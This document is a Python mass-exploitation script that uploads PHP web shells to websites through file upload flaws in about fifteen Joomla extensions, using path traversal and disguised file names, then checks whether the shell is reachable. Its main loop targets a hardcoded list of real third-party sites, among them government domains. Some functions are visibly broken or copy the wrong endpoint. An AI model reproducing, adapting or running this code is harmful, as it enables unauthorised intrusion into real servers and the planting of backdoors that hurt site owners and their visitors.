import os
import requests
import re
import warnings
warnings.filterwarnings("ignore")
import curlify
def com_jce(url):
        headers = {}
        headers['User-Agent'] = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801'
        endpoint = url+"/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20"
        data = {
                'upload-dir':'./../../',
                'upload-overwrite':0,
                'Filedata' : [open('shell/VulnX.gif','rb')],
                'action':'Upload',
        }
        r = requests.post(endpoint, data=data, headers=headers,verify=False)
       ##print("curl : " ,curlify.to_curl(r.request))
        dump_data = url + "/VulnX.gif"
        res=requests.get(dump_data, headers)
        ##print("detect : " ,curlify.to_curl(res.request))
        matches = re.findall(re.compile(r'/image/gif/'),res.text)
        if matches:
            return dict(
                url=url,
                name="com_jce",
                status=True,
                shell=dump_data
            )
        else:
            return dict(
                url=url,
                name="com_jce",
                status=False
            )
def com_media(url):
        headers = {}
        headers['User-Agent'] = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801'
        endpoint = url+"/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder="
        headers={"content-type":"form-data"}
        fieldname = 'Filedata[]'
        shell = open('shell/VulnX.txt','rb')
        #print(shell)
        data = {
                fieldname:shell,
        }
        r = requests.post(endpoint, data=data, headers=headers,verify=False)
        #print("curl : " ,curlify.to_curl(r.request))
        dump_data = endpoint+"/images/XAttacker.txt"
        res=requests.get(dump_data, headers)
        #print("detect : " ,curlify.to_curl(res.request))
        matches = re.findall(re.compile(r'/image/gif/'),res.text)
        
        response = requests.get(dump_data,headers,verify=False).text
        if re.findall(r'Tig', response):
            return dict(
                url=url,
                name="com_media",
                status=True,
                shell=dump_data
            )
        else:
            return dict(
                url=url,
                name="com_media",
                status=False
            )
def com_fabrika(url):
        headers = {} 
        headers['User-Agent'] = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801'
        endpoint = url+"/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload"
        headers={"content-type":"form-data"}
        fieldname = 'file'
        shell = open('shell/VulnX.php','rb')
        data = {
                fieldname:shell,
        }
        #print(data)
        r = requests.post(endpoint, data=data, headers=headers)
        ##print("curl : " ,curlify.to_curl(r.request))
        dump_data = endpoint+"/images/XAttacker.txt"
        res=requests.get(dump_data, headers)
        #print("detect : " ,curlify.to_curl(res.request))
        response = requests.get(dump_data,headers,verify=False).text
        if re.findall(r'Vuln X', response):
            return dict(
                url=url,
                name="com_fabrika",
                status=True,
                shell=dump_data
            )
        else:
            return dict(
                url=url,
                name="com_fabrika",
                status=False
            )
def com_fabrikb(url):
        headers = {} 
        headers['User-Agent'] = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801'
        endpoint = url+"/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload"


        headers={"content-type":"form-data"}
        fieldname = 'file'
        shell = open('shell/VulnX.txt','rb')
        data = {
                fieldname:shell,
        }
        r = requests.post(endpoint, data=data, headers=headers)
        #print("curl : " ,curlify.to_curl(r.request))
        dump_data = endpoint+"/images/XAttacker.txt"
        response = requests.get(dump_data,headers,verify=False).text
        if re.findall(r'Tig', response):
            return dict(
                url=url,
                name="com_fabrik2",
                status=True,
                shell=dump_data
            )
        else:
            return dict(
                url=url,
                name="com_fabrik2",
                status=False
            )
def com_foxcontact(url):
        headers = {} 
        headers['User-Agent'] = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801'
    #    foxf = {'components/com_foxcontact/lib/file-uploader.php?cid={}&mid={}&qqfile=/../../_func.php',
    #            'index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id={}?cid={}&mid={}&qqfile=/../../_func.php',
    #            'index.php?option=com_foxcontact&amp;view=loader&amp;type=uploader&amp;owner=module&amp;id={}&cid={}&mid={}&owner=module&id={}&qqfile=/../../_func.php',
    #            'components/com_foxcontact/lib/uploader.php?cid={}&mid={}&qqfile=/../../_func.php'}
        endpoint = url+"/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload"

        headers={"content-type":"form-data"}
        fieldname = 'file'
        shell = open('shell/VulnX.txt','rb')
        data = {
                fieldname:shell,
        }
        r =requests.post(endpoint, data=data, headers=headers,verify=False)
        #print("curl : " ,curlify.to_curl(r.request))
        dump_data = endpoint+"/images/XAttacker.txt"
        response = requests.get(dump_data,headers).text
        if re.findall(r'Tig', response):
            return dict(
                url=url,
                name="com_foxcontact",
                status=True,
                shell=dump_data
            )
        else:
            return dict(
                url=url,
                name="com_foxcontact",
                status=False
            )
def com_adsmanager(url):
        headers = {} 
        proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "https://127.0.0.1:8080",
        }
        endpoint = url + "/index.php?option=com_adsmanager&task=upload&tmpl=component"
        img = 'shell/VulnX.php'
        name_img= os.path.basename('shell/VulnX.html')
        files= {'image': img }
        #print(files)
        r = requests.post(endpoint,files=files ,headers=headers,verify=False)
        ##print("curl : " ,curlify.to_curl(r.request))
        shellup = url + "/tmp/plupload/VulnX.html"
        checkShell = requests.get(shellup).text
        statusCheck = re.findall(re.compile(r'VulnX'),checkShell)
        if statusCheck:
            return dict(
                url=url,
                name="com_adsmanager",
                status=True,
                shell=shellup
            )
        else:
            return dict(
                url=url,
                name="com_adsmanager",
                status=False
            )
def com_blog(url):
        headers = {} 
        endpoint = url + "/index.php?option=com_myblog&task=ajaxupload"
        r = requests.get(endpoint,headers=headers,verify=False)
        #print("curl : " ,curlify.to_curl(r.request))
        statusCheck = re.findall(re.compile(r'has been uploaded'),r.text)
        if statusCheck:
            return dict(
                url=url,
                name="com_blog",
                status=True,
                shell=''
            )
        else:
            return dict(
                url=url,
                name="com_blog",
                status=False
            )
def com_users(url):
        endpoint = url + "/index.php?option=com_users&view=registration"
        checkShell = requests.get(endpoint,headers=headers,verify=False).text
        statusCheck = re.findall(re.compile(r'jform_email2-lbl'),checkShell)
        if statusCheck:
            return dict(
                url=url,
                name="com_users",
                status=True,
                shell=''
            )
        else:
            return dict(
                url=url,
                name="com_users",
                status=False
            )
def comweblinks(url):
        endpoint = url + "/index.php?option=com_media&view=images&tmpl=component&e_name=jform_description&asset=com_weblinks&author="
        token = re.findall(re.compile(r'<form action=\"(.*?)" id="uploadForm\"'),endpoint)
        if token:
            url = token.group(1)
        img = open('shell/VulnX.php', 'rb')
        name_img= os.path.basename('shell/VulnX.gif')
        fieldname = "image[]"
        files= {'image': (name_img,img,'form-data',{'Expires': '0'})}
        data = { fieldname : files }
        r=requests.post(endpoint, data=data, verify=False)
        #print("curl : " ,curlify.to_curl(r.request))
        shellup = url + "/images/VulnX.gif"
        checkShell = requests.get(shellup)
        if checkShell.status_code == 200:
            return dict(
                url=url,
                name="comweblinks",
                status=True,
                shell=shellup
            )
        else:
            return dict(
                url=url,
                name="comweblinks",
                status=False
            )
#fail
def mod_simplefileupload(url):
        headers = {}
        endpoint = url + "/modules/mod_simplefileuploadv1.3/elements/udd.php"
        img = open('shell/VulnX.php.mp4', 'rb')
        name_img= os.path.basename('shell/VulnX.php.mp4')
        files= {'image': (name_img,img,'multipart/form-data',{'Expires': '0'})}
        #print(files)
        r = requests.post(endpoint, headers=headers,data = {},files=files)
        #print("curl : " ,curlify.to_curl(r.request))
        shellup = url + "/modules/mod_simplefileuploadv1.3/elements/VulnX.php?Vuln=X"
        checkShell = requests.get(shellup).text
        statusCheck = re.findall(re.compile(r'Vuln X'),checkShell)
        if statusCheck:
            return dict(
                url=url,
                name="mod_simplefileupload",
                status=True,
                shell=shellup
            )
        else:
            return dict(
                url=url,
                name="mod_simplefileupload",
                status=False
            )
def com_jbcatalog(url):
        headers={}
        proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "https://127.0.0.1:8080",
        }
        endpoint = url + "components/com_jbcatalog/libraries/jsupload/server/php"
        img = open('shell/VulnX.php', 'rb')
        name_img= os.path.basename('shell/VulnX.php')
        fieldname = "image[]"
        files= {'image': (name_img,img,'multipart/form-data',{'Expires': '0'})}
        data = { fieldname : files }
        #print(endpoint, headers, data)
        r = requests.post(endpoint, headers=headers, data=data,verify=True)
        #print(endpoint, headers, data)
        #print("curl : " ,curlify.to_curl(r.request))
        shellup = url + "components/com_jbcatalog/libraries/jsupload/server/php/files/VulnX.php?Vuln=X"
        checkShell = requests.get(shellup).text
        statusCheck = re.findall(re.compile(r'Vuln X'),checkShell)
        if statusCheck:
            return dict(
                url=url,
                name="com_jbcatalog",
                status=True,
                shell=shellup
            )
        else:
            return dict(
                url=url,
                name="com_jbcatalog",
                status=False
            )
def com_sexycontactform(url):
        endpoint = url + "/com_sexycontactform/fileupload/index.php"
        img = open('shell/VulnX.php', 'rb')
        name_img= os.path.basename('shell/VulnX.php')
        fieldname = "image[]"
        files= {'image': (name_img,img,'multipart/form-data',{'Expires': '0'})}
        data = { fieldname : files }
        requests.post(endpoint, data=data,verify=False).text
        shellup = url + "/com_sexycontactform/fileupload/files/files/VulnX.php?Vuln=X"
        checkShell = requests.get(shellup,headers=headers,verify=False).text
        statusCheck = re.findall(re.compile(r'Vuln X'),checkShell)
        if statusCheck:
            return dict(
                url=url,
                name="com_sexycontactform",
                status=True,
                shell=shellup
            )
        else:
            return dict(
                url=url,
                name="com_sexycontactform",
                status=False
            )
def com_rokdownloads(url):
        headers = {}
        endpoint = url + "/administrator/components/com_rokdownloads/assets/uploadhandler.php"
        img = open('shell/VulnX.php', 'rb')
        name_img= os.path.basename('shell/VulnX.php')
        fieldname = "Filedata"
        files= {'image': (name_img,img,'multipart/form-data',{'Expires': '0'})}
        data = { fieldname : files,
                'jpath' : '..%2F..%2F..%2F..%2F',
                }
        r = requests.post(endpoint, data=data, headers=headers,verify=False)
        #print("curl : " ,curlify.to_curl(r.request))
        shellup = url + "/images/stories/VulnX.php?Vuln=X"
        checkShell = requests.get(shellup,headers=headers,verify=False).text
        statusCheck = re.findall(re.compile(r'Vuln X'),checkShell)
        if statusCheck:
            return dict(
                url=url,
                name="com_rokdownloads",
                status=True,
                shell=shellup
            )
        else:
            return dict(
                url=url,
                name="com_rokdownloads",
                status=False
            )
def com_extplorer(url):
        endpoint = url + "/administrator/components/com_extplorer/uploadhandler.php"
        img = open('shell/VulnX.php', 'rb')
        name_img= os.path.basename('shell/VulnX.php')
        fieldname = "Filedata"
        files= {'image': (name_img,img,'multipart/form-data',{'Expires': '0'})}
        data = { fieldname : files }
        requests.post(endpoint, data, headers=headers,verify=False).text
        shellup = url + "/images/stories/VulnX.php?Vuln=X"
        checkShell = requests.get(shellup,headers=headers,verify=False).text
        statusCheck = re.findall(re.compile(r'Vuln X'),checkShell)
        if statusCheck:
            return dict(
                url=url,
                name="com_extplorer",
                status=True,
                shell=shellup
            )
        else:
            return dict(
                url=url,
                name="com_extplorer",
                status=False
            )
def com_jwallpapers(url):
        endpoint = url + "/index.php?option=com_jwallpapers&task=upload"
        img = open('shell/VulnX.php', 'rb')
        name_img= os.path.basename('shell/VulnX.php')
        fieldname = "Filedata"
        files= {'image': (name_img,img,'multipart/form-data',{'Expires': '0'})}
        data = { fieldname : files ,
                'submit' : 'Upload',
                }
        requests.post(endpoint, data, headers=headers,verify=False).text
        shellup = url + "/jwallpapers_files/plupload/VulnX.php?Vuln=X"
        checkShell = requests.get(shellup,headers=headers,verify=False).text
        statusCheck = re.findall(re.compile(r'Vuln X'),checkShell)
        if statusCheck:
            return dict(
                url=url,
                name="com_jwallpapers",
                status=True,
                shell=shellup
            )
        else:
            return dict(
                url=url,
                name="com_jwallpapers",
                status=False
            )
def com_facileforms(url):
        endpoint = url + "/components/com_facileforms/libraries/jquery/uploadify.php"
        img = open('shell/VulnX.php', 'rb')
        name_img= os.path.basename('shell/VulnX.php')
        fieldname = "Filedata"
        files= {'image': (name_img,img,'multipart/form-data',{'Expires': '0'})}
        data = { fieldname : files ,
                'folder' : '/components/com_facileforms/libraries/jquery/',
                }
        requests.post(endpoint, data, headers=headers,verify=False).text
        shellup = url + "/components/com_facileforms/libraries/jquery/VulnX.php?Vuln=X"
        checkShell = requests.get(shellup,headers=headers,verify=False).text
        statusCheck = re.findall(re.compile(r'Vuln X'),checkShell)
        if statusCheck:
            return dict(
                url=url,
                name="com_facileforms",
                status=True,
                shell=shellup
            )
        else:
            return dict(
                url=url,
                name="com_facileforms",
                status=False
            )
def main(url):
    try:
        jce = com_jce(url)
        media = com_media(url)
        fabrika = com_fabrika(url)
        fabrikb = com_fabrikb(url)
        foxcontact = com_foxcontact(url)
        adsmanager = com_adsmanager(url)
        users = com_users(url)
        weblinks = comweblinks(url)
        simplefileupload = mod_simplefileupload(url)
        jbcatalog = com_jbcatalog(url)
        sexycontactform = com_sexycontactform(url)
        rokdownloads = com_rokdownloads(url)
        extplorer = com_extplorer(url)
        jwallpapers = com_jwallpapers(url)
        facileforms = com_facileforms(url)
        List.append(jce)
        List.append(media)
        List.append(fabrika)
        List.append(fabrikb)
        List.append(foxcontact)
        List.append(adsmanager)
        List.append(users)
        List.append(weblinks)
        List.append(simplefileupload)
        List.append(jbcatalog)
        List.append(sexycontactform)
        List.append(rokdownloads)
        List.append(extplorer)
        List.append(jwallpapers)
        List.append(facileforms)
    except:
        pass

List = []
headers = {}
urls = ['http://www.nookfarmborrowdale.co.uk/','https://www.miamilakes-fl.gov/','http://spbrta.customs.ru/','http://www.lindisfarne-keswick.co.uk/','http://www.tohsband.org/','https://www.pa-tulangbawang.go.id/','https://184.154.52.107/','https://espi.or.at/index.php','http://www.in.cnr.it/']
for url in urls:
    print(f"scan >>>>> {url} ")
    main(url)
    for i in List:
        if i["status"]:
            print(i)
print("===================================end============================")
for i in List:
    if i["status"]:
        print(i)
print("===========================stop======================")